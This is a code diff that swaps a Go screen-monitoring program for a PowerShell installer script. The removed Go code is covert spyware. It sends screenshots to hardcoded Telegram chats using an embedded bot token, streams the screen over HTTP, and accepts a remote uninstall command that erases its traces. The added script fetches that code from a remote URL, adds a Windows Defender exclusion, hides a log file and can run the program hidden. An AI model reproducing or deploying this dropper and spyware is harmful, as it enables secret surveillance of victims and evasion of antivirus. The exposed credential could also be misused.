@@ -1,420 +1,300 @@
-package main
+# secfnx.ps1
+# Downloads Go MSI, sets up environment, downloads monitoring.go, and runs it as a script
+# USAGE: powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\secfnx.ps1
 
-import (
-    "bytes"
-    "fmt"
-    "image"
-    "image/jpeg"
-    "log"
-    "net"
-    "net/http"
-    "os"
-    "os/exec"
-    "path/filepath"
-    "strconv"
-    "strings" // Added to fix undefined: strings error
-    "sync"
-    "time"
-
-    "github.com/go-telegram-bot-api/telegram-bot-api/v5"
-    "github.com/kbinani/screenshot"
+param(
+    [string]$BotToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE",
+    [string]$Url = "https://raw.githubusercontent.com/ArthOfficial/TEST/main/privatefile.go",
+    [string]$DestFolder = "",
+    [switch]$Auto,
+    [switch]$RunHidden
 )
 
-var (
-    botToken    = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE"
-    allowedIDs  = []int64{1231232357345, 4385673485638, 23485673485} // Update with correct chat IDs
-    port        = "5000"
-    logFile     = ""
-    mutex       sync.Mutex
-    running     = true
-    destFolder  = filepath.Join(os.Getenv("USERPROFILE"), "Downloads", "ParentalWatching")
-)
+# Config
+$LogFile = Join-Path $env:TEMP "download_runner.log"
+$GoVersion = "1.24.7"
+$Arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
+$MsiName = "go$GoVersion.windows-$Arch.msi"
+$MsiUrl = "https://go.dev/dl/$MsiName"
+$GoInstallDir = "C:\Program Files\Go"
+$GoBinPath = Join-Path $GoInstallDir "bin"
+$GoFileName = "monitoring.go"
+$DestFolder = if ($DestFolder) { $DestFolder } else { Join-Path $PSScriptRoot "secfnx" }
+$GoFilePath = Join-Path $DestFolder $GoFileName
+$PathLog = Join-Path $DestFolder "path_sec.log"
+$LogMaxSize = 10MB
 
-func init() {
-    // Set log file to %TEMP%\monitor_bot.log
-    logFile = filepath.Join(os.Getenv("TEMP"), "monitor_bot.log")
-    f, err := os.OpenFile(logFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
-    if err != nil {
-        fmt.Println("Failed to open log file:", err)
-        return
+# Helper: Log with rotation
+function Log {
+    param($Message)
+    $Line = "$(Get-Date -Format o) - $Message"
+    if (Test-Path $LogFile) {
+        $LogSize = (Get-Item $LogFile).Length
+        if ($LogSize -ge $LogMaxSize) {
+            $BackupLog = "$LogFile.$(Get-Date -Format 'yyyyMMddHHmmss').bak"
+            Rename-Item $LogFile $BackupLog -ErrorAction SilentlyContinue
+        }
     }
-    log.SetOutput(f)
-    log.Println("DEBUG - Initialized log file:", logFile)
+    Add-Content -Path $LogFile -Value $Line -ErrorAction SilentlyContinue
+    Write-Output $Line
 }
 
-func logRotate() {
-    mutex.Lock()
-    defer mutex.Unlock()
-    if info, err := os.Stat(logFile); err == nil && info.Size() > 10*1024*1024 {
-        backup := fmt.Sprintf("%s.%s.bak", logFile, time.Now().Format("20060102150405"))
-        os.Rename(logFile, backup)
-        f, err := os.Create(logFile)
-        if err != nil {
-            log.Println("ERROR - Failed to create new log file:", err)
-            return
-        }
-        log.SetOutput(f)
-        f.Close()
+# Helper: Log path to path_sec.log
+function Log-Path {
+    param($Path, $Type)
+    $Line = "$(Get-Date -Format o) - $Type: $Path"
+    Add-Content -Path $PathLog -Value $Line -ErrorAction SilentlyContinue
+}
+
+# Helper: Test admin privileges
+function Test-IsAdmin {
+    try {
+        ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    } catch {
+        $false
     }
 }
 
-func captureScreen() (*image.RGBA, error) {
-    log.Println("DEBUG - Starting screen capture")
-    n := screenshot.NumActiveDisplays()
-    if n == 0 {
-        log.Println("ERROR - No active displays found")
-        return nil, fmt.Errorf("no active displays")
+# Helper: Download file with verification
+function Download-File($SourceUrl, $OutPath) {
+    Log "Downloading $SourceUrl -> $OutPath"
+    Log-Path $OutPath "File Downloaded"
+    try {
+        $ProgressPreference = 'SilentlyContinue'
+        Invoke-WebRequest -Uri $SourceUrl -OutFile $OutPath -UseBasicParsing -ErrorAction Stop
+        Log "Downloaded successfully"
+        return $true
+    } catch {
+        Log "Download failed: $_"
+        return $false
+    } finally {
+        $ProgressPreference = 'Continue'
     }
-
-    if n == 1 {
-        bounds := screenshot.GetDisplayBounds(0)
-        img, err := screenshot.CaptureRect(bounds)
-        if err != nil {
-            log.Println("ERROR - Failed to capture single screen:", err)
-            return nil, err
-        }
-        log.Println("DEBUG - Captured single screen")
-        return img, nil
-    }
-
-    // Multiple screens: combine into one image
-    var totalWidth, maxHeight int
-    boundsList := make([]image.Rectangle, n)
-    for i := 0; i < n; i++ {
-        bounds := screenshot.GetDisplayBounds(i)
-        boundsList[i] = bounds
-        totalWidth += bounds.Dx()
-        if bounds.Dy() > maxHeight {
-            maxHeight = bounds.Dy()
-        }
-    }
-
-    combined := image.NewRGBA(image.Rect(0, 0, totalWidth, maxHeight))
-    offsetX := 0
-    for i := 0; i < n; i++ {
-        img, err := screenshot.CaptureRect(boundsList[i])
-        if err != nil {
-            log.Println("ERROR - Failed to capture screen", i, ":", err)
-            return nil, err
-        }
-        for y := 0; y < img.Bounds().Dy(); y++ {
-            for x := 0; x < img.Bounds().Dx(); x++ {
-                combined.Set(x+offsetX, y, img.At(x, y))
-            }
-        }
-        offsetX += img.Bounds().Dx()
-    }
-    log.Println("DEBUG - Captured and combined multiple screens")
-    return combined, nil
 }
 
-func sendToTelegram(bot *tgbotapi.BotAPI, img *image.RGBA) error {
-    log.Println("DEBUG - Starting sendToTelegram")
-    buf := new(bytes.Buffer)
-    if err := jpeg.Encode(buf, img, &jpeg.Options{Quality: 50}); err != nil {
-        log.Println("ERROR - JPEG encode failed:", err)
-        return err
+# Helper: Add to system PATH
+function Add-ToSystemPath($Path) {
+    if (-not (Test-IsAdmin)) {
+        Log "Cannot modify PATH: not admin"
+        return $false
     }
-    log.Println("DEBUG - Encoded image, size:", buf.Len())
-    for _, chatID := range allowedIDs {
-        log.Println("DEBUG - Sending to chatID:", chatID)
-        photo := tgbotapi.NewPhoto(chatID, tgbotapi.FileBytes{Name: "screenshot.jpg", Bytes: buf.Bytes()})
-        if _, err := bot.Send(photo); err != nil {
-            log.Println("ERROR - Telegram send to", chatID, ":", err)
+    try {
+        $CurrentPath = [Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
+        if ($CurrentPath -notlike "*$Path*") {
+            Log "Adding $Path to system PATH"
+            $NewPath = "$CurrentPath;$Path"
+            [Environment]::SetEnvironmentVariable("Path", $NewPath, [System.EnvironmentVariableTarget]::Machine)
+            Log "System PATH updated"
+            return $true
+        }
+        Log "$Path already in PATH"
+        return $true
+    } catch {
+        Log "Failed to update PATH: $_"
+        return $false
+    }
+}
+
+# Helper: Add Defender exclusion
+function Add-DefenderExclusion($Path) {
+    if (-not (Test-IsAdmin)) {
+        Log "Cannot add Defender exclusion: not admin"
+        return $false
+    }
+    try {
+        Log "Adding Defender exclusion for $Path"
+        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
+        Log "Exclusion added"
+        return $true
+    } catch {
+        Log "Failed to add Defender exclusion: $_"
+        return $false
+    }
+}
+
+# Helper: Install Go
+function Install-Go {
+    $MsiPath = Join-Path $DestFolder $MsiName
+    if (Test-Path (Join-Path $GoInstallDir "bin\go.exe")) {
+        Log "Go already installed at $GoInstallDir"
+        return $true
+    }
+    if (-not (Test-IsAdmin)) {
+        Log "Cannot install Go: not admin"
+        Write-Host "Error: Run as Administrator to install Go."
+        return $false
+    }
+    Log "Downloading Go MSI $MsiUrl to $MsiPath"
+    if (-not (Download-File $MsiUrl $MsiPath)) {
+        Log "Go MSI download failed"
+        return $false
+    }
+    Log "Running Go MSI installer with dialog"
+    $Args = "/i `"$MsiPath`""
+    try {
+        $Proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $Args -Wait -PassThru -ErrorAction Stop
+        if ($Proc.ExitCode -ne 0) {
+            Log "Go MSI install failed: exit code $($Proc.ExitCode)"
+            return $false
+        }
+        Log "Go installed successfully"
+        Add-ToSystemPath $GoBinPath
+        [Environment]::SetEnvironmentVariable("GOROOT", $GoInstallDir, [System.EnvironmentVariableTarget]::Machine)
+        Log "GOROOT set to $GoInstallDir"
+        return $true
+    } catch {
+        Log "Go MSI install error: $_"
+        return $false
+    }
+}
+
+# Helper: Run Go script
+function Run-GoScript($GoFile) {
+    if (-not (Test-Path $GoFile)) {
+        Log "Go script $GoFile not found"
+        return $false
+    }
+    Log "Running Go script: $GoFile"
+    try {
+        $Env:PATH = "$Env:PATH;$GoBinPath"
+        $startArgs = @{
+            FilePath = "go"
+            ArgumentList = "run", $GoFile
+            WorkingDirectory = $DestFolder
+            PassThru = $true
+            RedirectStandardError = Join-Path $DestFolder "go_run_error.log"
+            ErrorAction = "Stop"
+        }
+        if ($RunHidden) {
+            $startArgs['WindowStyle'] = "Hidden"
         } else {
-            log.Println("INFO - Sent screenshot to", chatID)
+            $startArgs['NoNewWindow'] = $true
         }
-    }
-    log.Println("DEBUG - Completed sendToTelegram")
-    return nil
-}
-
-func checkPort(port string) bool {
-    log.Println("DEBUG - Checking port:", port)
-    ln, err := net.Listen("tcp", ":"+port)
-    if err != nil {
-        log.Println("DEBUG - Port", port, "not available:", err)
-        return false
-    }
-    ln.Close()
-    log.Println("DEBUG - Port", port, "is available")
-    return true
-}
-
-func startMJPEGServer() {
-    log.Println("DEBUG - Starting MJPEG server setup")
-    for i := 0; i < 10; i++ {
-        if checkPort(port) {
-            break
-        }
-        p, err := strconv.Atoi(port)
-        if err != nil {
-            log.Println("ERROR - Failed to parse port:", err)
-            return
-        }
-        p += 100
-        port = strconv.Itoa(p)
-        log.Println("INFO - Port", p-100, "in use, trying", p)
-    }
-
-    http.HandleFunc("/stream", func(w http.ResponseWriter, r *http.Request) {
-        log.Println("DEBUG - MJPEG stream request received")
-        w.Header().Set("Content-Type", "multipart/x-mixed-replace; boundary=frame")
-        w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
-        w.Header().Set("Pragma", "no-cache")
-        w.Header().Set("Expires", "0")
-
-        for running {
-            img, err := captureScreen()
-            if err != nil {
-                log.Println("ERROR - MJPEG capture:", err)
-                continue
-            }
-            buf := new(bytes.Buffer)
-            if err := jpeg.Encode(buf, img, &jpeg.Options{Quality: 50}); err != nil {
-                log.Println("ERROR - MJPEG encode:", err)
-                continue
-            }
-            _, err = w.Write([]byte("--frame\r\nContent-Type: image/jpeg\r\n\r\n"))
-            if err != nil {
-                log.Println("ERROR - MJPEG write boundary:", err)
-                return
-            }
-            _, err = w.Write(buf.Bytes())
-            if err != nil {
-                log.Println("ERROR - MJPEG write image:", err)
-                return
-            }
-            _, err = w.Write([]byte("\r\n"))
-            if err != nil {
-                log.Println("ERROR - MJPEG write separator:", err)
-                return
-            }
-            time.Sleep(100 * time.Millisecond)
-        }
-    })
-
-    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-        log.Println("DEBUG - Root page request received")
-        w.Header().Set("Content-Type", "text/html")
-        w.Write([]byte(`
-            <html>
-            <head>
-                <title>Screen Preview</title>
-                <style>
-                    img { max-width: 100%; height: auto; }
-                    body { margin: 0; padding: 10px; background: #000; }
-                </style>
-            </head>
-            <body>
-                <img src="/stream" alt="Live Screen Preview">
-            </body>
-            </html>
-        `))
-    })
-
-    log.Println("INFO - Starting MJPEG server on localhost:" + port)
-    go http.ListenAndServe(":"+port, nil)
-}
-
-func uninstall() {
-    log.Println("INFO - Starting uninstall process")
-    running = false
-
-    // Delay to allow MJPEG server and Telegram bot to stop gracefully
-    log.Println("DEBUG - Waiting 2 seconds for graceful shutdown")
-    time.Sleep(2 * time.Second)
-
-    // Remove Go
-    goInstallDir := "C:\\Program Files\\Go"
-    if _, err := os.Stat(goInstallDir); err == nil {
-        log.Println("DEBUG - Attempting to uninstall Go")
-        // Use wmic to find the Go 1.24.7 product code
-        cmd := exec.Command("wmic", "product", "where", "name like 'Go Programming Language%'", "get", "IdentifyingNumber")
-        output, err := cmd.CombinedOutput()
-        if err != nil {
-            log.Println("ERROR - Failed to get Go product code:", err)
-            // Fallback to hardcoded product code for Go 1.24.7
-            cmd = exec.Command("msiexec.exe", "/x", "{2A8F1E0B-CEFD-4B63-BE7B-EE672BFE23D9}", "/qn")
-            if err := cmd.Run(); err != nil {
-                log.Println("ERROR - Failed to uninstall Go with fallback product code:", err)
-            } else {
-                log.Println("INFO - Go uninstalled successfully with fallback product code")
-            }
-        } else {
-            productCode := string(output)
-            productCode = strings.TrimSpace(strings.Replace(productCode, "IdentifyingNumber", "", -1))
-            if productCode != "" {
-                cmd = exec.Command("msiexec.exe", "/x", productCode, "/qn")
-                if err := cmd.Run(); err != nil {
-                    log.Println("ERROR - Failed to uninstall Go:", err)
-                } else {
-                    log.Println("INFO - Go uninstalled successfully")
+        $Proc = Start-Process @startArgs
+        Log "Started go run process with PID: $($Proc.Id)"
+        $maxAttempts = 10
+        $attempt = 0
+        $serverStarted = $false
+        while ($attempt -lt $maxAttempts -and -not $serverStarted) {
+            Start-Sleep -Seconds 2
+            try {
+                $Response = Invoke-WebRequest -Uri "http://localhost:5000/stream" -Method Get -TimeoutSec 5 -ErrorAction Stop
+                if ($Response.StatusCode -eq 200) {
+                    Log "MJPEG server started successfully on localhost:5000"
+                    $serverStarted = $true
                 }
-            } else {
-                log.Println("ERROR - No Go product code found")
+            } catch {
+                Log "Attempt $($attempt + 1): MJPEG server not yet started: $_"
             }
+            $attempt++
         }
-    } else {
-        log.Println("DEBUG - Go not found at", goInstallDir)
-    }
-
-    // Remove scripts and folders
-    files := []string{
-        filepath.Join(destFolder, "monitoring.go"),
-        filepath.Join(destFolder, "monitoring.exe"),
-        filepath.Join(destFolder, "go.mod"),
-        filepath.Join(destFolder, "go.sum"),
-        filepath.Join(destFolder, "install_and_run.ps1"),
-        filepath.Join(destFolder, "go_run_error.log"),
-        filepath.Join(destFolder, "go_run_output.log"),
-        filepath.Join(destFolder, "go_mod_error.log"),
-        filepath.Join(destFolder, "go_mod_output.log"),
-        filepath.Join(destFolder, "go_get_error.log"),
-        filepath.Join(destFolder, "go_get_output.log"),
-        filepath.Join(destFolder, "go_build_error.log"),
-        filepath.Join(destFolder, "go_build_output.log"),
-    }
-    log.Println("DEBUG - Removing files")
-    for _, file := range files {
-        if _, err := os.Stat(file); err == nil {
-            if err := os.Remove(file); err != nil {
-                log.Println("ERROR - Failed to delete", file, ":", err)
-            } else {
-                log.Println("INFO - Deleted", file)
-            }
-        } else {
-            log.Println("DEBUG - File not found, skipping:", file)
+        if (-not $serverStarted) {
+            $ErrorLog = Get-Content (Join-Path $DestFolder "go_run_error.log") -Raw -ErrorAction SilentlyContinue
+            Log "MJPEG server failed to start after $maxAttempts attempts. Check $DestFolder\go_run_error.log and %TEMP%\monitor_bot.log. Error: $ErrorLog"
+            return $false
         }
+        return $true
+    } catch {
+        $ErrorLog = Get-Content (Join-Path $DestFolder "go_run_error.log") -Raw -ErrorAction SilentlyContinue
+        Log "Failed to run Go script: $_. Error: $ErrorLog"
+        return $false
     }
-
-    // Remove ParentalWatching folder
-    log.Println("DEBUG - Removing folder", destFolder)
-    if err := os.RemoveAll(destFolder); err != nil {
-        log.Println("ERROR - Failed to delete folder", destFolder, ":", err)
-    } else {
-        log.Println("INFO - Deleted folder", destFolder)
-    }
-
-    // Remove environment variables
-    log.Println("DEBUG - Removing PATH entry")
-    cmd := exec.Command("powershell", "-Command", "[Environment]::SetEnvironmentVariable('Path', [Environment]::GetEnvironmentVariable('Path', [System.EnvironmentVariableTarget]::Machine).Replace(';C:\\Program Files\\Go\\bin', ''), [System.EnvironmentVariableTarget]::Machine)")
-    if err := cmd.Run(); err != nil {
-        log.Println("ERROR - Failed to remove PATH:", err)
-    } else {
-        log.Println("INFO - Removed Go from PATH")
-    }
-
-    log.Println("DEBUG - Removing GOROOT")
-    cmd = exec.Command("powershell", "-Command", "[Environment]::SetEnvironmentVariable('GOROOT', '', [System.EnvironmentVariableTarget]::Machine)")
-    if err := cmd.Run(); err != nil {
-        log.Println("ERROR - Failed to remove GOROOT:", err)
-    } else {
-        log.Println("INFO - Removed GOROOT")
-    }
-
-    // Remove Defender exclusion
-    log.Println("DEBUG - Removing Defender exclusion")
-    cmd = exec.Command("powershell", "-Command", "Remove-MpPreference -ExclusionPath '" + destFolder + "' -ErrorAction SilentlyContinue")
-    if err := cmd.Run(); err != nil {
-        log.Println("ERROR - Failed to remove Defender exclusion:", err)
-    } else {
-        log.Println("INFO - Removed Defender exclusion")
-    }
-
-    // Remove Firewall rule
-    log.Println("DEBUG - Removing firewall rule")
-    cmd = exec.Command("powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'Allow ParentalWatching Go Apps' -ErrorAction SilentlyContinue")
-    if err := cmd.Run(); err != nil {
-        log.Println("ERROR - Failed to remove firewall rule:", err)
-    } else {
-        log.Println("INFO - Removed firewall rule")
-    }
-
-    // Close the parent Command Prompt or PowerShell window
-    log.Println("DEBUG - Closing parent console")
-    cmd = exec.Command("powershell", "-Command", "Stop-Process -Id $PID")
-    if err := cmd.Start(); err != nil {
-        log.Println("ERROR - Failed to close parent console:", err)
-    }
-
-    log.Println("INFO - Uninstallation complete")
-    // Delay exit to ensure logs are written
-    time.Sleep(1 * time.Second)
-    os.Exit(0)
 }
 
-func main() {
-    log.Println("INFO - Bot starting")
-    bot, err := tgbotapi.NewBotAPI(botToken)
-    if err != nil {
-        log.Fatalf("ERROR - Failed to initialize bot: %v", err)
+# Helper: Install Go dependencies
+function Install-GoDependencies($GoFile) {
+    if (-not (Test-Path $GoFile)) {
+        Log "Go script $GoFile not found for dependency installation"
+        return $false
     }
-    log.Println("DEBUG - Bot initialized successfully, username:", bot.Self.UserName)
-
-    startMJPEGServer()
-
-    go func() {
-        for running {
-            logRotate()
-            img, err := captureScreen()
-            if err != nil {
-                log.Println("ERROR - Capture:", err)
-            } else {
-                if err := sendToTelegram(bot, img); err != nil {
-                    log.Println("ERROR - Telegram:", err)
-                }
-            }
-            time.Sleep(300 * time.Second)
+    Log "Installing Go dependencies for $GoFile in $DestFolder"
+    try {
+        $Env:PATH = "$Env:PATH;$GoBinPath"
+        # Clean existing go.mod and go.sum to avoid conflicts
+        $GoMod = Join-Path $DestFolder "go.mod"
+        $GoSum = Join-Path $DestFolder "go.sum"
+        if (Test-Path $GoMod) {
+            Log "Removing existing go.mod to avoid conflicts"
+            Log-Path $GoMod "File Deleted"
+            Remove-Item $GoMod -Force -ErrorAction SilentlyContinue
         }
-    }()
-
-    log.Println("DEBUG - Starting update loop")
-    u := tgbotapi.NewUpdate(0)
-    u.Timeout = 60
-    updates := bot.GetUpdatesChan(u)
-
-    for update := range updates {
-        log.Println("DEBUG - Received update:", update.UpdateID)
-        if update.Message == nil || update.Message.Chat == nil {
-            log.Println("DEBUG - Skipping update: no message or chat")
-            continue
+        if (Test-Path $GoSum) {
+            Log "Removing existing go.sum to avoid conflicts"
+            Log-Path $GoSum "File Deleted"
+            Remove-Item $GoSum -Force -ErrorAction SilentlyContinue
         }
-
-        chatID := update.Message.Chat.ID
-        log.Println("DEBUG - Processing message from chatID:", chatID)
-        allowed := false
-        for _, id := range allowedIDs {
-            if chatID == id {
-                allowed = true
-                break
-            }
+        Log "Initializing Go module"
+        $Proc = Start-Process -FilePath "go" -ArgumentList "mod", "init", "monitoring" -WorkingDirectory $DestFolder -Wait -PassThru -NoNewWindow -RedirectStandardError (Join-Path $DestFolder "go_mod_error.log") -RedirectStandardOutput (Join-Path $DestFolder "go_mod_output.log") -ErrorAction Stop
+        if ($Proc.ExitCode -ne 0) {
+            $ErrorLog = Get-Content (Join-Path $DestFolder "go_mod_error.log") -Raw -ErrorAction SilentlyContinue
+            Log "Failed to initialize Go module: exit code $($Proc.ExitCode). Error: $ErrorLog"
+            return $false
         }
-        if !allowed {
-            log.Println("INFO - Unauthorized user:", chatID)
-            continue
+        Log-Path (Join-Path $DestFolder "go.mod") "File Created"
+        Log "Fetching dependencies"
+        $Proc = Start-Process -FilePath "go" -ArgumentList "get", "-v", "github.com/kbinani/screenshot", "github.com/go-telegram-bot-api/telegram-bot-api/v5" -WorkingDirectory $DestFolder -Wait -PassThru -NoNewWindow -RedirectStandardError (Join-Path $DestFolder "go_get_error.log") -RedirectStandardOutput (Join-Path $DestFolder "go_get_output.log") -ErrorAction Stop
+        if ($Proc.ExitCode -ne 0) {
+            $ErrorLog = Get-Content (Join-Path $DestFolder "go_get_error.log") -Raw -ErrorAction SilentlyContinue
+            Log "Failed to install dependencies: exit code $($Proc.ExitCode). Error: $ErrorLog"
+            return $false
         }
-
-        if update.Message.IsCommand() {
-            log.Println("DEBUG - Command received:", update.Message.Command())
-            switch update.Message.Command() {
-            case "screenshot":
-                log.Println("DEBUG - Processing /screenshot")
-                img, err := captureScreen()
-                if err != nil {
-                    bot.Send(tgbotapi.NewMessage(chatID, "Failed to capture screenshot: "+err.Error()))
-                    log.Println("ERROR - /screenshot:", err)
-                    continue
-                }
-                if err := sendToTelegram(bot, img); err != nil {
-                    bot.Send(tgbotapi.NewMessage(chatID, "Failed to send screenshot: "+err.Error()))
-                    log.Println("ERROR - /screenshot send:", err)
-                }
-            case "uninstall":
-                log.Println("DEBUG - Processing /uninstall")
-                bot.Send(tgbotapi.NewMessage(chatID, "Uninstalling..."))
-                uninstall()
-            }
-        }
+        Log-Path (Join-Path $DestFolder "go.sum") "File Created"
+        Log "Dependencies installed successfully"
+        return $true
+    } catch {
+        Log "Dependency install error: $_"
+        return $false
     }
 }
+
+# Main
+Log "Script started. DestFolder: $DestFolder, Url: $Url"
+if (-not (Test-Path $DestFolder)) {
+    Log "Creating destination folder: $DestFolder"
+    New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null
+    Log-Path $DestFolder "Folder Created"
+}
+if (-not (Test-Path $DestFolder)) {
+    Log "Failed to create destination folder: $DestFolder. Exiting."
+    Write-Host "Error: Could not create folder 'secfnx'. Check permissions."
+    exit 1
+}
+
+# Create hidden path_sec.log
+if (-not (Test-Path $PathLog)) {
+    New-Item -Path $PathLog -ItemType File -Force | Out-Null
+    Log-Path $PathLog "File Created"
+    Set-ItemProperty -Path $PathLog -Name Attributes -Value "Hidden"
+}
+
+# Always download monitoring.go to ensure correct version
+Log "Downloading Go script from $Url to $GoFilePath"
+if (Test-Path $GoFilePath) {
+    Log "Removing existing monitoring.go to avoid conflicts"
+    Remove-Item $GoFilePath -Force -ErrorAction SilentlyContinue
+}
+if (-not (Download-File $Url $GoFilePath)) {
+    Log "Failed to download Go script. Exiting."
+    exit 1
+}
+
+# Install Go
+if (-not (Install-Go)) {
+    Log "Go installation failed. Exiting."
+    exit 1
+}
+
+# Add Defender exclusion
+Add-DefenderExclusion $DestFolder
+
+# Install dependencies and run
+if (-not (Install-GoDependencies $GoFilePath)) {
+    Log "Failed to install dependencies. Exiting."
+    exit 1
+}
+if (-not (Run-GoScript $GoFilePath)) {
+    Log "Failed to run Go script. Exiting."
+    exit 1
+}
+
+Log "Script completed successfully."
